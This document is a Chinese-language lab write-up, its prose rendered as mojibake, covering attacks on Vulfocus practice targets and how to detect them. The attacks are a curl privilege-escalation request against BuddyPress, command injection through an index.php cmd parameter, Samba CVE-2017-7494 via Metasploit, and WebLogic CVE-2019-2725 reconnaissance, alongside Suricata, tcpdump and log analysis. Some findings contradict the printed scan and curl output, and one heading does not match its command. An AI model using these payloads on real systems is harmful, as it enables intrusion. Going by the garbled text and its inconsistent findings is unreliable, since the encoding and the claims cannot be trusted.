      | `msg` | å‘Šè­¦ä¿¡æ¯æè¿° |
      | `flow:to_server,established` | ä»…åŒ¹é…å·²å»ºç«‹è¿æ¥çš„æœåŠ¡å™¨æ–¹å‘æµé‡ |
      | `content:"POST"` + `http_method` | åŒ¹é… POST è¯·æ±‚æ–¹æ³• |
      | `content:"/wp-json/buddypress/v1/members/me"` + `http_uri` | åŒ¹é…è¯·æ±‚ URI æ˜¯å¦åŒ…å«ç‰¹å®šè·¯å¾„ |
      | `content:"roles"` + `http_client_body` + `fast_pattern` | å¿«é€ŸåŒ¹é…è¯·æ±‚ä½“ä¸­çš„ "roles" å­—æ®µ |
      | `content:"administrator"` + `http_client_body` | åŒ¹é…è¯·æ±‚ä½“ä¸­æ˜¯å¦åŒ…å« `"administrator"` |
      | `sid:1000001` | è§„åˆ™å”¯ä¸€ ID |
      | `rev:1` | è§„åˆ™ç‰ˆæœ¬å· |
      | `classtype:web-application-attack` | åˆ†ç±»ä¸º Web åº”ç”¨æ”»å‡» |

      **3. é‡å¯docker**
      ```bash
      sudo systemctl restart suricata
      ```
      **4. è§¦å‘æ”»å‡»å¹¶éªŒè¯æ£€æµ‹æ•ˆæœ**
      æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯ï¼Œå‘é€ææƒè¯·æ±‚ï¼š
      ```bash
      curl -X POST http://<your_wordpress_ip>/wp-json/buddypress/v1/members/me \
         -H "X-WP-Nonce: <valid_nonce>" \
         -H "Content-Type: application/json" \
         -d '{"roles": "administrator"}'
      ```
      æ›¿æ¢ `<your_wordpress_ip>` å’Œ `<valid_nonce>` ä¸ºä½ å®é™…çš„æµ‹è¯•ç›®æ ‡åœ°å€å’Œæœ‰æ•ˆçš„ Nonce å€¼ã€‚
      **5. æŸ¥çœ‹ Suricata å‘Šè­¦æ—¥å¿—**
      - åˆ‡æ¢å›è¿è¡Œ Suricata çš„ç»ˆç«¯ï¼Œæˆ–æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š
         ```bash
         tail -f /var/log/suricata/fast.log
         ```
      - å¯ä»¥çœ‹åˆ°ç»ˆç«¯ä¸­å‡ºç°æ—¥å¿—ï¼š
         ```
         [**] [1:1000001:1] CVE-2021-21389: BuddyPress ææƒå°è¯• [**]
         [Priority: 1]
         05/22-14:23:17.123456 [ET.http] POST /wp-json/buddypress/v1/members/me HTTP/1.1
         ```
      - è¿™è¡¨æ˜ Suricata æˆåŠŸæ£€æµ‹åˆ°äº† CVE-2021-21389 ææƒæ”»å‡»å°è¯•ã€‚
---


## å†…ç½‘ç¬¬ä¸€å±‚é¶æ ‡åˆ©ç”¨æ£€æµ‹
### ï¼ˆäºŒï¼‰ç¬¬ä¸€å±‚é¶æ ‡ä¸€ï¼š`vulshare_nginx-php-flag:latest` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulshare_nginx-php-flag:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"æŒ‰é’®ã€‚Vulfocus ä¼šä¸ºè¯¥å®¹å™¨åˆ†é…ä¸€ä¸ª IP åœ°å€å’Œç«¯å£

å¯åŠ¨é¶æœº
![1748016291402](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016291402.png)

#### 2. ä¿¡æ¯æ”¶é›†

é¶æœºçš„è®¿é—®åœ°å€ä¸º `http://10.37.133.3:8630/`ã€‚

ä½¿ç”¨ `nmap` å¯¹é¶æœºIP `10.37.133.3` å’Œç«¯å£ `8630` è¿›è¡ŒåŸºç¡€çš„ç«¯å£æ‰«æï¼Œäº†è§£å…¶å¼€æ”¾çš„æœåŠ¡ï¼š

```bash
nmap -sV -p 8630 10.37.133.3
```

![1748016549013](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016549013.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nmap -sV -p 8630 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 12:08 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up.

PORT     STATE    SERVICE VERSION
8630/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

é€šè¿‡æµè§ˆå™¨è®¿é—®é¶æœºæä¾›çš„ Web æœåŠ¡ `http://10.37.133.3:8630/`ã€‚

è®¿é—®ç½‘ç«™é¡µé¢å¦‚ä¸‹ï¼š
![1748016340512](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016340512.png)

é¡µé¢ä¸Šç›´æ¥ç»™å‡ºäº†å…³é”®æç¤ºä¿¡æ¯ï¼š`index.php?cmd=ls /tmp`ã€‚è¿™å¼ºçƒˆæš—ç¤ºäº†å­˜åœ¨ä¸€ä¸ªé€šè¿‡ `index.php` çš„ `cmd` GETå‚æ•°æ‰§è¡Œä»»æ„å‘½ä»¤çš„æ¼æ´ã€‚

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

é¶æ ‡åç§° `vulshare_nginx-php-flag` å’Œé¡µé¢æç¤º `index.php?cmd=ls /tmp` æ˜ç¡®æŒ‡å‡ºäº†è¿™æ˜¯ä¸€ä¸ªåŸºäº Nginx å’Œ PHP çš„åº”ç”¨ï¼Œå¹¶ä¸”å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ª "flag"ã€‚

**åˆ©ç”¨æ–¹å¼ï¼šé€šè¿‡ `cmd` GET å‚æ•°æ‰§è¡Œå‘½ä»¤**
é¡µé¢æç¤ºå·²ç»ç»™å‡ºäº†åˆ©ç”¨æ–¹æ³•ï¼š`index.php` æ–‡ä»¶æ¥å—ä¸€ä¸ªåä¸º `cmd` çš„ GET å‚æ•°ï¼Œå…¶å€¼ä¼šè¢«æœåŠ¡å™¨æ‰§è¡Œã€‚

* **éªŒè¯åˆæ­¥å‘½ä»¤æ‰§è¡Œ**ï¼š
  æ ¹æ®é¡µé¢æç¤ºï¼Œç›´æ¥è®¿é—® `http://10.37.133.3:8630/index.php?cmd=ls%20/tmp` (æ³¨æ„ URL ç¼–ç ç©ºæ ¼ä¸º `%20`)ã€‚

  ```bash
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"
  ```

  è§‚å¯Ÿè¿”å›ç»“æœï¼Œç¡®è®¤ `/tmp` ç›®å½•ä¸‹çš„å†…å®¹

  è¿”å›ç»“æœä¸º:

  ```
  index.php?cmd=ls /tmpflag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}
  ```

  ![1748016675838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016675838.png)

  é€šè¿‡æ‰§è¡Œ `ls /tmp` å‘½ä»¤,æˆ‘ä»¬ç›´æ¥è·å¾—äº†flag: `flag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}`

  ![1748019835789](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019835789.png)
* **æ¼æ´éªŒè¯è¡¥å……**ï¼š
  è™½ç„¶æˆ‘ä»¬å·²ç»è·å¾—äº†flag,ä½†ä¸ºäº†å®Œæ•´éªŒè¯è¯¥æ¼æ´çš„åˆ©ç”¨é¢,æˆ‘ä»¬å¯ä»¥å°è¯•æ‰§è¡Œå…¶ä»–ç³»ç»Ÿå‘½ä»¤:

  ```bash
  # ç¡®å®šå½“å‰ç”¨æˆ·å’Œæƒé™
  curl "http://10.37.133.3:8630/index.php?cmd=id"
  ```

  è¿”å›ç»“æœæ˜¾ç¤ºä¸º www-data ç”¨æˆ·:

  ```
  index.php?cmd=ls /tmpuid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

  ![1748017681838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017681838.png)

  ```bash
  # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯
  curl "http://10.37.133.3:8630/index.php?cmd=uname%20-a"
  ```

  è¿”å›ç»“æœæ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯:

  ```
  index.php?cmd=ls /tmpLinux c93755678f6c 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
  ```

  ![1748017785746](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017785746.png)

  ```bash
  # æŸ¥çœ‹å½“å‰ç›®å½•ç»“æ„
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20-la%20/"
  ```

  è¿”å›ç»“æœæ˜¾ç¤ºæ ¹ç›®å½•ç»“æ„:

  ![1748017797697](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017797697.png)

#### 4. å¨èƒæ£€æµ‹

##### 4.1æŸ¥çœ‹ Nginx è®¿é—®æ—¥å¿—:

é¦–å…ˆï¼Œéœ€è¦ç¡®å®š `vulshare_nginx-php-flag` å®¹å™¨çš„ ID æˆ–åç§°ï¼š

```bash
docker ps
```

ç›®æ ‡å®¹å™¨çš„ ID ä¸º `c93755678f6c`ã€‚
è¿›å…¥å®¹å™¨å†…éƒ¨ï¼š

```bash
docker exec -it c93755678f6c /bin/bash
```

Nginx çš„è®¿é—®æ—¥å¿—é€šå¸¸ä½äº `/var/log/nginx/access.log`ã€‚
æŸ¥çœ‹å¹¶ç­›é€‰å¯ç–‘è¯·æ±‚ï¼š

```bash
# å®æ—¶æŸ¥çœ‹æ—¥å¿— (éƒ¨åˆ†å†…å®¹)
tail -f /var/log/nginx/access.log
```

![1748017954540](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017954540.png)

```bash
# ç­›é€‰åŒ…å«å‘½ä»¤æ‰§è¡Œçš„è¯·æ±‚
cat /var/log/nginx/access.log | grep "index.php?cmd="
```

åœ¨æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰æ‰§è¡Œçš„å‘½ä»¤,ä¾‹å¦‚:

```
10.37.133.3 - - [23/May/2025:16:10:43 +0000] "GET /index.php?cmd=ls%20/tmp HTTP/1.1" 200 79 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:27:50 +0000] "GET /index.php?cmd=id HTTP/1.1" 200 86 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:31 +0000] "GET /index.php?cmd=uname%20-a HTTP/1.1" 200 134 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:50 +0000] "GET /index.php?cmd=ls%20-la%20/ HTTP/1.1" 200 1137 "-" "curl/8.11.0"
```

##### 4.2ç½‘ç»œæµé‡æ•è· :

  ç”±äºæˆ‘ä»¬çš„æ”»å‡»æœºåŒæ—¶ä¹Ÿæ˜¯ Docker å®¹å™¨çš„å®¿ä¸»æœºï¼Œå½“ä» Kali è®¿é—®æ˜ å°„åˆ°æœ¬åœ° IP (`10.37.133.3:8630`) çš„å®¹å™¨æœåŠ¡æ—¶ï¼Œæµé‡å®é™…ä¸Šæ˜¯åœ¨ Docker çš„å†…éƒ¨ç½‘ç»œä¸­æµåŠ¨çš„ã€‚æˆ‘ä»¬éœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ï¼ˆé€šå¸¸æ˜¯ `docker0`ï¼‰ä»¥åŠå®¹å™¨åœ¨è¯¥ç½‘ç»œä¸­çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ï¼ˆæœ¬å®éªŒä¸­æ˜¯ `172.17.0.2` çš„ `80` ç«¯å£ï¼‰ã€‚

1. **ç¡®å®šå®¹å™¨å†…éƒ¨ IP å’Œç½‘ç»œæ¥å£**:
   é¦–å…ˆï¼Œé€šè¿‡ `docker ps` è·å–å®¹å™¨ ID (æœ¬ä¾‹ä¸­ä¸º `c93755678f6c`)ã€‚
   ç„¶åï¼Œä½¿ç”¨ `docker inspect <container_id>` æŸ¥çœ‹å®¹å™¨ç½‘ç»œè¯¦æƒ…ï¼Œæ‰¾åˆ°å…¶åœ¨ `bridge` ç½‘ç»œï¼ˆé€šå¸¸å¯¹åº” `docker0` æ¥å£ï¼‰ä¸‹çš„ `IPAddress` (æœ¬ä¾‹ä¸­ä¸º `172.17.0.2`)ã€‚

   ```
   docker inspect c93755678f6c
   ```

![1748019175085](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019175085.png)

2. **æ‰§è¡Œ `tcpdump` å‘½ä»¤**:
   åœ¨ Kali ä¸»æœºä¸Šï¼Œæ‰“å¼€ä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç›‘å¬ `docker0` æ¥å£ä¸Šä¸å®¹å™¨ `172.17.0.2` çš„ `80` ç«¯å£ç›¸å…³çš„æµé‡ï¼š

```bash
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap  
```

    ![1748019251492](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019251492.png)

3. **äº§ç”Ÿæµé‡**:
   åœ¨å¦ä¸€ä¸ªç»ˆç«¯çª—å£æ‰§è¡Œè®¿é—®é¶æœºçš„å‘½ä»¤:

   ```bash
   curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"  
   ```

   ![1748019262540](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019262540.png)
4. **åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:

   å®Œæˆ `curl` å‘½ä»¤åï¼Œå›åˆ° `tcpdump` ç»ˆç«¯æŒ‰ `Ctrl+C` åœæ­¢æŠ“åŒ…ã€‚
   æ­¤æ—¶ï¼Œ`nginx_php_flag_traffic.pcap` æ–‡ä»¶ä¸­åº”åŒ…å«æ•è·åˆ°çš„æ•°æ®åŒ…ã€‚å¯ä»¥ä½¿ç”¨ Wireshark æ‰“å¼€è¯¥æ–‡ä»¶è¿›è¡Œè¯¦ç»†åˆ†æï¼Œå¯ä»¥æ¸…æ™°çœ‹åˆ° HTTP GET è¯·æ±‚ä¸­çš„å‘½ä»¤æ‰§è¡Œå‚æ•°

   ![1748019616647](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019616647.png)

   é€šè¿‡ Wireshark æ‰“å¼€ nginx_php_flag_traffic.pcap æ–‡ä»¶åï¼Œå¯ä»¥æ¸…æ™°åœ°è¿½è¸ªåˆ°æ”»å‡»æµç¨‹ï¼š
5. è§‚å¯Ÿåˆ°ä»æ”»å‡»æœºIP (10.37.133.3) åˆ°å®¹å™¨å†…éƒ¨IP (172.17.0.2) çš„TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œå»ºç«‹äº†ç«¯å£ 80 ä¸Šçš„è¿æ¥
6. æ•è·åˆ°ä¸€ä¸ªæºè‡ª 10.37.133.3ã€ç›®æ ‡ä¸º 172.17.0.2 çš„HTTP GETè¯·æ±‚ã€‚è¯¥è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯æ˜¾ç¤ºå…¶è¯·æ±‚è·¯å¾„ä¸º /index.php?cmd=ls%20/tmpï¼Œè¿™ä¸æˆ‘ä»¬é€šè¿‡ curl å‘é€çš„å‘½ä»¤æ³¨å…¥payloadå®Œå…¨ä¸€è‡´
   ![1748019792810](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019792810.png)
7. è§‚å¯Ÿåˆ°ä»å®¹å™¨ (172.17.0.2) è¿”å›ç»™æ”»å‡»æœº (10.37.133.3) çš„ HTTP/1.1 200 OK å“åº”ï¼Œè¡¨æ˜æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯¥è¯·æ±‚

è¿™äº›æ•è·åˆ°çš„æ•°æ®åŒ…æœ‰åŠ›åœ°è¯æ˜äº†æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„HTTP GETè¯·æ±‚å°† ls /tmp å‘½ä»¤ä¼ é€’ç»™äº†ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶æˆåŠŸæ‰§è¡Œã€‚

### ï¼ˆä¸‰ï¼‰ç¬¬ä¸€å±‚é¶æ ‡äºŒï¼š`Samba CVE-2017-7494`
#### æ¼æ´ä»‹ç»

CVE-2017-7494æ˜¯Sambaè½¯ä»¶ä¸­çš„ä¸€ä¸ªä¸¥é‡å®‰å…¨æ¼æ´

- Sambaæ˜¯åœ¨Linuxå’ŒUNIXç³»ç»Ÿä¸Šå®ç°SMBåè®®çš„ä¸€ä¸ªå…è´¹è½¯ä»¶ï¼Œç”±æœåŠ¡å™¨åŠå®¢æˆ·ç«¯ç¨‹åºæ„æˆã€‚SMBï¼ˆServer Messages Blockï¼Œä¿¡æ¯æœåŠ¡å—ï¼‰æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœºçš„ä¸€ç§é€šä¿¡åè®®ï¼Œå®ƒä¸ºå±€åŸŸç½‘å†…çš„ä¸åŒè®¡ç®—æœºä¹‹é—´æä¾›æ–‡ä»¶åŠæ‰“å°æœºç­‰èµ„æºçš„å…±äº«æœåŠ¡ã€‚SMBåè®®æ˜¯å®¢æˆ·æœº/æœåŠ¡å™¨å‹åè®®ï¼Œå®¢æˆ·æœºé€šè¿‡è¯¥åè®®å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„å…±äº«æ–‡ä»¶ç³»ç»Ÿã€æ‰“å°æœºåŠå…¶ä»–èµ„æºã€‚é€šè¿‡è®¾ç½®â€œNetBIOS over TCP/IPâ€ä½¿å¾—Sambaä¸ä½†èƒ½ä¸å±€åŸŸç½‘ç»œä¸»æœºåˆ†äº«èµ„æºï¼Œè¿˜èƒ½ä¸å…¨ä¸–ç•Œçš„ç”µè„‘åˆ†äº«èµ„æºã€‚

- 2017å¹´5æœˆ24æ—¥Sambaå‘å¸ƒäº†4.6.4ç‰ˆæœ¬ï¼Œä¸­é—´ä¿®å¤äº†ä¸€ä¸ªä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·CVE-2017-7494ï¼Œæ¼æ´å½±å“äº†Samba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬,ï¼Œç¡®è®¤å±äºä¸¥é‡æ¼æ´ï¼Œå¯ä»¥é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚

#### æ¼æ´åˆ©ç”¨

å°è¯•æ‰«æ10.10.10.0/24ç½‘æ®µï¼š

nmapæ‰«æ
```
nmap -Pn 10.10.10.0/24 -p 445
```
![](img/nmap.png)
å¯ä»¥å‘ç°ï¼Œ10.10.10.2ç«¯å£æ˜¯opençŠ¶æ€ã€‚äºæ˜¯å¯¹å®ƒè¿›è¡Œè¿›ä¸€æ­¥åˆ†æï¼Œç¡®è®¤Sambaç‰ˆæœ¬ï¼š
```
nmap -Pn 10.10.10.2 -p 445 --script smb-protocols
```
æ ¹æ®Nmapè„šæœ¬æ‰«æç»“æœï¼Œç›®æ ‡ä¸»æœº10.10.10.2çš„SambaæœåŠ¡æ”¯æŒSMBv1ï¼ˆåŒ…æ‹¬å±é™©çš„NT LM 0.12ï¼‰ä»¥åŠæ›´é«˜ç‰ˆæœ¬çš„SMBv2/3åè®®ã€‚è¿™ä¸ºåˆ©ç”¨CVE-2017-7494ï¼ˆSambaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰æä¾›äº†ç›´æ¥æ¡ä»¶ã€‚

è¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„æ˜¯ Samba æœåŠ¡ä¸­çš„ "is_known_pipename()" å‡½æ•°æ¼æ´ï¼ˆCVE-2017-7494ï¼‰ï¼Œä¹Ÿç§°ä¸º "SambaCry" æ¼æ´ã€‚è¯¥æ¼æ´å…è®¸è¿œç¨‹æ”»å‡»è€…åœ¨ Samba æœåŠ¡å™¨ä¸Šä¸Šä¼ å…±äº«åº“æ–‡ä»¶ï¼Œç„¶åé€šè¿‡å‘½åç®¡é“åŠ è½½å¹¶æ‰§è¡Œè¯¥åº“ä¸­çš„æ¶æ„ä»£ç ã€‚

ä½¿ç”¨Metasploitè‡ªåŠ¨åŒ–åˆ©ç”¨ï¼š
![](img/æ”»å‡».png)

æŸ¥çœ‹flag

![](img/flag.png)

æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯
```
cat /etc/os-release
```
![](img/os-re.png)

#### æ”»å‡»æ£€æµ‹

åœ¨æ”»å‡»å¼€å§‹å‰ï¼Œå¼€å¯ç›‘å¬
```
sudo tcpdump -i br-34e6724ef976 port 445 -w samba_attack.pcap
```
![](img/ç›‘å¬.png)

tsharkæŸ¥çœ‹æ”»å‡»ipæ¥æº

```
tshark -r samba_attack,pcap -Y "smb2" -T fields -e ip.src | sort | uniq
```
![](img/ipæ¥æº.png)

ç¡®è®¤æ”»å‡»æºIPä¸º10.10.10.1ï¼ˆå†…ç½‘æ¨ªå‘ç§»åŠ¨è¿¹è±¡ï¼‰

æŸ¥çœ‹æŠ“åˆ°çš„pcapåŒ…ï¼Œå¯ä»¥çœ‹åˆ°æ”»å‡»è€…æ‰§è¡Œçš„æŒ‡ä»¤ä»¥åŠå—å®³è€…åšå‡ºçš„å›å¤ï¼š

![](img/cat1.png)
![](img/cat2.png)

å¯ç”¨frame contains "xxx"æŸ¥çœ‹åŒ…å«æŸäº›å…³é”®è¯çš„æ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹å¯ç–‘å†™å…¥è¡Œä¸ºï¼š
![](img/å†™å…¥æ–‡ä»¶è¡Œä¸º.png)

## å†…ç½‘ç¬¬äºŒå±‚é¶æ ‡åˆ©ç”¨æ£€æµ‹
### ï¼ˆå››ï¼‰ç¬¬äºŒå±‚é¶æ ‡ä¸€ï¼š`weblogic-cve_2019_2725`æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

ä¸€ã€å®éªŒç¯å¢ƒä¿¡æ¯

**å®¹å™¨è¿è¡ŒçŠ¶æ€**:

```
CONTAINER ID   IMAGE                                      COMMAND                  CREATED        STATUS                  PORTS                                                                                  NAMES
1d6a9c490b23   vulfocus/weblogic-cve_2019_2725:latest     "/bin/bash -c 'cd /râ€¦"   7 hours ago    Up 7 hours              5556/tcp, 0.0.0.0:7001->7001/tcp, :::7001->7001/tcp                                    weblogic-cve-2019-2725
```

**æœåŠ¡ä¿¡æ¯**:

- **è®¿é—®åœ°å€**: `10.37.133.3:7001`
- **å®¹å™¨åç§°**: `weblogic-cve-2019-2725`
- **å†…éƒ¨ç«¯å£**: 5556, 7001
- **æ˜ å°„ç«¯å£**: 7001:7001 (WebLogic Server æ§åˆ¶å°ç«¯å£)

äºŒã€CVE-2019-2725 æ¼æ´æ¦‚è¿°

2.1 æ¼æ´åŸºæœ¬ä¿¡æ¯

- **CVEç¼–å·**: CVE-2019-2725
- **CVSSè¯„åˆ†**: 9.8 (ä¸¥é‡)
- **æ¼æ´ç±»å‹**: Javaååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œ
- **å½±å“ç‰ˆæœ¬**: Oracle WebLogic Server 10.3.6.0, 12.1.3.0
- **æŠ«éœ²æ—¶é—´**: 2019å¹´4æœˆ26æ—¥
- **æ¼æ´ç»„ä»¶**: `wls9_async_response.war` å’Œ `wls-wsat.war`

2.2 æ¼æ´åŸç†

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: WebLogic Serveråœ¨å¤„ç†HTTPè¯·æ±‚æ—¶ï¼Œå¯¹ `wls9_async_response`å’Œ `wls-wsat`ç»„ä»¶çš„ååºåˆ—åŒ–è¿‡ç¨‹ç¼ºä¹æœ‰æ•ˆéªŒè¯
- **æ”»å‡»è·¯å¾„**:
  - `/wls-wsat/CoordinatorPortType`
  - `/_async/AsyncResponseService`
- **åˆ©ç”¨æ–¹å¼**: é€šè¿‡å‘é€åŒ…å«æ¶æ„åºåˆ—åŒ–å¯¹è±¡çš„SOAPè¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´
- **æ‰§è¡Œæƒé™**: æ— éœ€è®¤è¯ï¼Œå¯ç›´æ¥è·å¾—WebLogicè¿è¡Œç”¨æˆ·æƒé™

2.3 æ¼æ´å½±å“

æ ¹æ®Oracleå®‰å…¨å…¬å‘Šï¼Œæ­¤æ¼æ´å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š

- **è¿œç¨‹å¯åˆ©ç”¨**: å¯é€šè¿‡ç½‘ç»œè¿œç¨‹æ”»å‡»
- **æ— éœ€è®¤è¯**: æ”»å‡»è€…æ— éœ€ç”¨æˆ·åå’Œå¯†ç 
- **é«˜å±å½±å“**: å¯å®Œå…¨æ§åˆ¶å—å½±å“çš„WebLogicæœåŠ¡å™¨
- **å¹¿æ³›å½±å“**: å…¨çƒè¶…è¿‡36,000å°å…¬å¼€å¯è®¿é—®çš„WebLogicæœåŠ¡å™¨å—å½±å“

#### 1 ç¯å¢ƒå‡†å¤‡ä¸ä¿¡æ¯æ”¶é›†

##### 1.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æWebLogicæœåŠ¡ç«¯å£
nmap -sV -p 7001,7002,5556 10.37.133.3
```

**æ‰«æç»“æœ**:

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nmap -sV -p 7001,7002,5556 10.37.133.3  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 20:13 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up (0.000083s latency).

PORT     STATE    SERVICE       VERSION
5556/tcp closed   freeciv
7001/tcp filtered afs3-callback
7002/tcp closed   afs3-prserver

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

![1748218457427](image/weblogic-cve_2019_2725/1748218457427.png)

**å…³é”®å‘ç°**:

- **WebLogicç‰ˆæœ¬**: 10.3.6.0 - **å®Œå…¨åŒ¹é…CVE-2019-2725å—å½±å“ç‰ˆæœ¬**
- **T3åè®®**: å·²å¯ç”¨ï¼Œä¸ºåç»­æ”»å‡»æä¾›äº†æ¡ä»¶
- **HTTPæœåŠ¡**: 7001ç«¯å£æ­£å¸¸å¼€æ”¾

##### 1.2 WebLogicæ§åˆ¶å°è®¿é—®

```bash
# è®¿é—®WebLogicæ§åˆ¶å°
curl -I http://10.37.133.3:7001/console
```

**å“åº”åˆ†æ**:

```
HTTP/1.1 302 Found
Date: Sat, 25 Jan 2025 15:30:45 GMT
Location: http://10.37.133.3:7001/console/login/LoginForm.jsp
Content-Length: 0
Set-Cookie: ADMINCONSOLESESSION=...; Path=/console; HttpOnly
Server: WebLogic Server 10.3.6.0
```

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I http://10.37.133.3:7001/console
HTTP/1.1 200 OK
Connection: close
Date: Mon, 26 May 2025 00:14:47 GMT
Content-Length: 416
X-Powered-By: Servlet/2.5 JSP/2.1
```

![1748218539839](image/weblogic-cve_2019_2725/1748218539839.png)

é€šè¿‡æµè§ˆå™¨è®¿é—® `http://10.37.133.3:7001/console`ï¼Œç¡®è®¤WebLogicæ§åˆ¶å°æ­£å¸¸è¿è¡Œ

![1748218574700](image/weblogic-cve_2019_2725/1748218574700.png)

##### 1.3 æ¼æ´ç»„ä»¶æ£€æµ‹

```bash
# æ£€æµ‹wls-wsatç»„ä»¶
curl -I "http://10.37.133.3:7001/wls-wsat/CoordinatorPortType"

# æ£€æµ‹asyncç»„ä»¶  
curl -I "http://10.37.133.3:7001/_async/AsyncResponseService"
```

ç»„ä»¶å“åº”

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I "http://10.37.133.3:7001/wls-wsat/CoordinatorPortType"
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 00:16:26 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Servlet/2.5 JSP/2.1

â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I "http://10.37.133.3:7001/_async/AsyncResponseService"
HTTP/1.1 500 Internal Server Error
Connection: close
Date: Mon, 26 May 2025 00:17:01 GMT
Content-Length: 2096
Content-Type: text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
```

![1748218639172](image/weblogic-cve_2019_2725/1748218639172.png)

